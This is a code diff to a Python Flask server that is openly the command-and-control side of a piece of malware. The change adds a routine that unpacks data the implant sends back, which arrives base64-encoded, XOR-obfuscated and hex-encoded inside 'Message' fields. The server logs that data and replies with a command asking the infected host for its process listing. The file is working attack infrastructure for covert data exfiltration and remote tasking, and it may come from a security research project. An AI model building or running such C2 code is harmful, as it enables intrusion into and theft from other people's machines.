@@ -3,9 +3,12 @@ import time
 import random
 import os
 import binascii
+import base64
+from json import loads as json_loads
 
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request
+from datetime import datetime
 
 
 app = Flask(__name__)
@@ -15,9 +18,9 @@ def check_identity_client(data): # this fonction is not realistic and must be ch
         return True
     return False
 
-def write_log(data_reveived = None, instruction_given = None): #must be completed
+def write_log(data = None): #must be completed
     with open("c2_log.txt", "a") as f:
-        f.write(f"time : {datetime.now()}, data_received : {data_reveived}, instruction_given : {instruction_given}")
+        f.write(f"time : {datetime.now()}, data : {data}" +'\n \n')
 
 def rand_byte():
     byte=''
@@ -96,6 +99,32 @@ def create_http_body(command=None):
         </assembly>
         """
 
+def get_data_from_malware(json):
+    """
+    Data are in the in the 'Message' fields
+    """
+    list_message_received = []
+    for k in range(len(json["steps"])):
+        try:
+            list_message_received.append(base64.urlsafe_b64decode(json["steps"][k]["Message"]).decode("ISO-8859-1"))
+        except:
+            pass
+
+    string_received = "".join(list_message_received)
+
+    xor_byte = ord("a")
+
+    xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])
+
+    answer_malware_string = binascii.unhexlify(xor_received.encode("ISO-8859-1")).decode("ISO-8859-1")
+
+    #json_data_received = json_loads(answer_malware_string)
+
+    date = str(datetime.now())
+    write_log(answer_malware_string)
+
+    return 1
+
 @app.route("/")
 def home():
     #write_log()
@@ -108,8 +137,10 @@ def send_instruction():
 
     if (content_type == 'application/json'):
         json_received = request.get_json()
-        print("json_received : ", json_received)
+        #print("json_received : ", json_received)
         #if check_identity_client(json_received): # C2 know it communicates with the malware
+        if json_received["steps"] != []:
+            get_data_from_malware(json_received)
 
         body = create_http_body(6) # GetProcessByDescription #Returns a process listing. If no arguments are provided returns just the PID and process name
         return body
